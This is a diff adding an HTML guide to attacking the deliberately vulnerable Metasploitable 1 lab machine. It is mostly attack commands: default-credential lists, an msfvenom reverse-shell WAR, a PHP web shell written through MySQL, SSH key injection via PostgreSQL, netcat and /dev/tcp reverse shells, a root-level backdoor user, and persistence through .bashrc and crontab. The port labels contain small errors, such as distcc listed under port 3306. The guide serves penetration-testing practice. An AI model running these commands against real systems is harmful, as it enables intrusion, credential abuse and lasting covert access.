@@ -1,0 +1,468 @@
+<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploitable 1 - Additional Exploration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #00d4ff;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
+            border-bottom: 2px solid #00d4ff;
+            padding-bottom: 10px;
+        }
+        .section {
+            background: #2a2a3e;
+            border-left: 4px solid #00d4ff;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .section h2 {
+            color: #00d4ff;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+        .service-card {
+            background: #1e1e2e;
+            border: 1px solid #404050;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+        }
+        .service-card h3 {
+            color: #ff9500;
+            margin-bottom: 10px;
+        }
+        .command-block {
+            background: #0d0d15;
+            border: 1px solid #00d4ff;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 3px;
+            overflow-x: auto;
+            font-size: 0.9em;
+            color: #00ff88;
+        }
+        .metasploit-cmd {
+            color: #ff6b6b;
+        }
+        .note {
+            background: #1a3a3a;
+            border-left: 3px solid #ff9500;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 2px;
+            font-size: 0.9em;
+        }
+        .exploit-path {
+            background: #2a1a1a;
+            border-left: 3px solid #ff6b6b;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 2px;
+        }
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab-button {
+            background: #1e1e2e;
+            border: 2px solid #404050;
+            color: #e0e0e0;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-family: inherit;
+            transition: all 0.3s;
+        }
+        .tab-button.active {
+            background: #00d4ff;
+            color: #0d0d15;
+            border-color: #00d4ff;
+        }
+        .tab-button:hover {
+            border-color: #00d4ff;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        ul, ol {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .difficulty.easy {
+            background: #00aa00;
+            color: white;
+        }
+        .difficulty.medium {
+            background: #ff9500;
+            color: white;
+        }
+        .difficulty.hard {
+            background: #ff3333;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Metasploitable 1 - Additional Exploration Guide</h1>
+        
+        <div class="tabs">
+            <button class="tab-button active" onclick="switchTab('web-services')">Web Services</button>
+            <button class="tab-button" onclick="switchTab('databases')">Databases</button>
+            <button class="tab-button" onclick="switchTab('mail-dns')">Mail & DNS</button>
+            <button class="tab-button" onclick="switchTab('post-exploitation')">Post-Exploitation</button>
+            <button class="tab-button" onclick="switchTab('persistence')">Persistence</button>
+        </div>
+
+        <!-- WEB SERVICES -->
+        <div id="web-services" class="tab-content active">
+            <div class="section">
+                <h2>HTTP & Tomcat Exploitation</h2>
+                
+                <div class="service-card">
+                    <h3>Port 80 - Apache HTTP <span class="difficulty easy">EASY</span></h3>
+                    <p><strong>Enumeration:</strong></p>
+                    <div class="command-block">curl -I http://192.168.105.3:80
+nikto -h 192.168.105.3 -p 80</div>
+                    
+                    <div class="note">
+                        <strong>Common Vulnerabilities:</strong> Outdated Apache, unpatched modules, directory traversal, CGI exploits
+                    </div>
+                    
+                    <p style="margin-top: 10px;"><strong>Exploitation Path:</strong></p>
+                    <div class="command-block metasploit-cmd">msfconsole
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.105.3
+run</div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Port 8180 - Tomcat Manager <span class="difficulty medium">MEDIUM</span></h3>
+                    <p><strong>Default Access:</strong></p>
+                    <div class="command-block">URL: http://192.168.105.3:8180/manager/html
+Username: tomcat
+Password: tomcat</div>
+                    
+                    <p style="margin-top: 10px;"><strong>If that fails, try:</strong></p>
+                    <ul>
+                        <li>tomcat:s3cret</li>
+                        <li>admin:admin</li>
+                        <li>admin:password</li>
+                    </ul>
+
+                    <p style="margin-top: 10px;"><strong>Exploitation - WAR Upload:</strong></p>
+                    <div class="command-block">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.105.X LPORT=4444 -f war -o shell.war
+
+# Then upload shell.war via Tomcat Manager GUI</div>
+
+                    <div class="note">
+                        <strong>Alternative (MSF):</strong> exploit/multi/http/tomcat_mgr_upload
+                    </div>
+
+                    <p style="margin-top: 10px;"><strong>Post-Upload Shell Access:</strong></p>
+                    <div class="command-block">nc -lvnp 4444
+# Then access: http://192.168.105.3:8180/shell/</div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Port 3306 - HTTP-RPC (Distcc) <span class="difficulty hard">HARD</span></h3>
+                    <p><strong>Vulnerability:</strong> Distributed compiler with no auth</p>
+                    <div class="command-block metasploit-cmd">msfconsole
+use exploit/unix/misc/distcc_exec
+set RHOSTS 192.168.105.3
+exploit</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- DATABASES -->
+        <div id="databases" class="tab-content">
+            <div class="section">
+                <h2>Database Exploitation</h2>
+                
+                <div class="service-card">
+                    <h3>MySQL (Port 3306) <span class="difficulty easy">EASY</span></h3>
+                    <p><strong>Enumeration:</strong></p>
+                    <div class="command-block">nmap -p 3306 -sV 192.168.105.3
+mysql -h 192.168.105.3 -u root
+mysql -h 192.168.105.3 -u root -p (if prompted)</div>
+
+                    <p style="margin-top: 10px;"><strong>Common Credentials:</strong></p>
+                    <ul>
+                        <li>root: (no password)</li>
+                        <li>root:root</li>
+                        <li>root:password</li>
+                    </ul>
+
+                    <p style="margin-top: 10px;"><strong>If Access Granted:</strong></p>
+                    <div class="command-block">show databases;
+use mysql;
+select user,password from user;
+show tables;</div>
+
+                    <div class="note">
+                        <strong>Privilege Escalation via MySQL:</strong> Write shell to webroot
+                    </div>
+                    <div class="command-block">SELECT "whoami" INTO OUTFILE "/var/www/html/shell.php";
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php';</div>
+                </div>
+
+                <div class="service-card">
+                    <h3>PostgreSQL (Port 5432) <span class="difficulty easy">EASY</span></h3>
+                    <p><strong>Connection:</strong></p>
+                    <div class="command-block">psql -h 192.168.105.3 -U postgres
+psql -h 192.168.105.3 -U postgres -W (for password prompt)</div>
+
+                    <p style="margin-top: 10px;"><strong>Default Credentials:</strong></p>
+                    <ul>
+                        <li>postgres: (no password)</li>
+                        <li>postgres:password</li>
+                    </ul>
+
+                    <p style="margin-top: 10px;"><strong>Exploitation:</strong></p>
+                    <div class="command-block">\l (list databases)
+\du (list users)
+\dt (list tables)
+
+-- Copy SSH key into authorized_keys
+COPY (SELECT 'your-public-key') TO PROGRAM 'echo your-public-key >> /root/.ssh/authorized_keys';</div>
+
+                    <div class="note">
+                        <strong>Requires:</strong> PostgreSQL running with COPY TO PROGRAM enabled (often default on old versions)
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MAIL & DNS -->
+        <div id="mail-dns" class="tab-content">
+            <div class="section">
+                <h2>Mail & DNS Services</h2>
+                
+                <div class="service-card">
+                    <h3>SMTP (Port 25) <span class="difficulty medium">MEDIUM</span></h3>
+                    <p><strong>Banner Grabbing:</strong></p>
+                    <div class="command-block">nc -v 192.168.105.3 25
+telnet 192.168.105.3 25</div>
+
+                    <p style="margin-top: 10px;"><strong>User Enumeration:</strong></p>
+                    <div class="command-block metasploit-cmd">msfconsole
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS 192.168.105.3
+run</div>
+
+                    <p style="margin-top: 10px;"><strong>Manual Enumeration:</strong></p>
+                    <div class="command-block">VRFY root
+VRFY mail
+VRFY www-data
+VRFY msfadmin</div>
+
+                    <div class="note">
+                        <strong>Sendmail Exploitation:</strong> Look for exploit/unix/smtp/sendmail_etrn if version is vulnerable
+                    </div>
+                </div>
+
+                <div class="service-card">
+                    <h3>DNS (Port 53) <span class="difficulty medium">MEDIUM</span></h3>
+                    <p><strong>Zone Transfer Attempt:</strong></p>
+                    <div class="command-block">nslookup
+> server 192.168.105.3
+> ls -d metasploitable.local
+> exit
+
+# Or via dig:
+dig @192.168.105.3 metasploitable.local AXFR</div>
+
+                    <p style="margin-top: 10px;"><strong>DNS Enumeration:</strong></p>
+                    <div class="command-block metasploit-cmd">msfconsole
+use auxiliary/gather/dns_enum
+set DOMAIN metasploitable.local
+set NAMESERVER 192.168.105.3
+run</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- POST-EXPLOITATION -->
+        <div id="post-exploitation" class="tab-content">
+            <div class="section">
+                <h2>Post-Exploitation & Privilege Escalation</h2>
+                
+                <div class="service-card">
+                    <h3>System Enumeration <span class="difficulty easy">EASY</span></h3>
+                    <p><strong>Basic Reconnaissance:</strong></p>
+                    <div class="command-block">whoami
+id
+uname -a
+cat /etc/os-release
+cat /etc/passwd
+sudo -l</div>
+
+                    <p style="margin-top: 10px;"><strong>Automated Enumeration:</strong></p>
+                    <div class="command-block">wget http://192.168.105.X/linpeas.sh -O /tmp/linpeas.sh
+bash /tmp/linpeas.sh</div>
+
+                    <div class="note">
+                        <strong>Note:</strong> Host linpeas.sh on your Kali machine: <code>python3 -m http.server 8000</code>
+                    </div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Kernel Exploitation <span class="difficulty hard">HARD</span></h3>
+                    <p><strong>Vulnerable Kernels (Linux 2.6.x):</strong></p>
+                    <ul>
+                        <li>CVE-2009-2698 (udev)</li>
+                        <li>CVE-2010-3904 (RDS privilege escalation)</li>
+                        <li>CVE-2010-0415 (CAN BCM privilege escalation)</li>
+                    </ul>
+
+                    <div class="command-block metasploit-cmd">msfconsole
+use exploit/linux/local/udev_netlink
+set SESSION 1
+exploit</div>
+                </div>
+
+                <div class="service-card">
+                    <h3>SUID Binary Hunting <span class="difficulty medium">MEDIUM</span></h3>
+                    <div class="command-block">find / -perm -4000 2>/dev/null
+find / -perm -2000 2>/dev/null</div>
+
+                    <p style="margin-top: 10px;"><strong>Check for writable SUID binaries or library injection:</strong></p>
+                    <div class="command-block">ls -la /usr/bin/nmap
+strings /usr/bin/nmap | grep -i library</div>
+
+                    <div class="note">
+                        <strong>Common Vuln:</strong> Old nmap versions had interactive mode that allowed shell escape
+                    </div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Cron Job Exploitation <span class="difficulty medium">MEDIUM</span></h3>
+                    <div class="command-block">cat /etc/crontab
+ls -la /etc/cron.d/
+ps aux | grep cron</div>
+
+                    <p style="margin-top: 10px;"><strong>If writable cron script found:</strong></p>
+                    <div class="command-block">echo "nc -e /bin/bash 192.168.105.X 5555" >> /vulnerable/cron/script.sh</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PERSISTENCE -->
+        <div id="persistence" class="tab-content">
+            <div class="section">
+                <h2>Persistence & Maintaining Access</h2>
+                
+                <div class="service-card">
+                    <h3>SSH Key Injection <span class="difficulty easy">EASY</span></h3>
+                    <p><strong>From Your Shell (as compromised user):</strong></p>
+                    <div class="command-block">mkdir -p ~/.ssh
+echo "ssh-rsa AAAA... your-public-key" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys</div>
+
+                    <p style="margin-top: 10px;"><strong>From Kali (generate key pair):</strong></p>
+                    <div class="command-block">ssh-keygen -t rsa -N "" -f /tmp/metasploit_key
+cat /tmp/metasploit_key.pub</div>
+
+                    <p style="margin-top: 10px;"><strong>Then SSH back:</strong></p>
+                    <div class="command-block">ssh -i /tmp/metasploit_key msfadmin@192.168.105.3</div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Backdoor User Creation <span class="difficulty medium">MEDIUM</span></h3>
+                    <div class="command-block"># Create user with UID 0 (root)
+useradd -m -p $(openssl passwd -1 password123) -u 0 -o backdoor
+# Or add to sudoers:
+echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers</div>
+
+                    <div class="note">
+                        <strong>Risk:</strong> May be detected by auditing tools. Use with caution.
+                    </div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Reverse Shell Upgrade <span class="difficulty easy">EASY</span></h3>
+                    <div class="command-block">python -c 'import pty; pty.spawn("/bin/bash")'
+# or
+bash -i >& /dev/tcp/192.168.105.X/4444 0>&1</div>
+
+                    <p style="margin-top: 10px;"><strong>On Kali listener:</strong></p>
+                    <div class="command-block">nc -lvnp 4444
+# Then upgrade shell:
+export TERM=xterm
+stty raw -echo
+fg</div>
+                </div>
+
+                <div class="service-card">
+                    <h3>Rootkit/Backdoor Installation <span class="difficulty hard">HARD</span></h3>
+                    <p><strong>Simple persistence via .bashrc/.profile:</strong></p>
+                    <div class="command-block">echo "bash -i >& /dev/tcp/192.168.105.X/9999 0>&1 &" >> ~/.bashrc</div>
+
+                    <p style="margin-top: 10px;"><strong>System-wide persistence:</strong></p>
+                    <div class="command-block">echo "* * * * * /usr/bin/nc 192.168.105.X 9999 -e /bin/bash" | crontab -</div>
+
+                    <div class="note">
+                        <strong>Advanced:</strong> Use msfvenom to generate persistent payloads
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function switchTab(tabName) {
+            // Hide all tabs
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // Remove active class from all buttons
+            const buttons = document.querySelectorAll('.tab-button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+            
+            // Add active class to clicked button
+            event.target.classList.add('active');
+        }
+    </script>
+</body>
+</html>
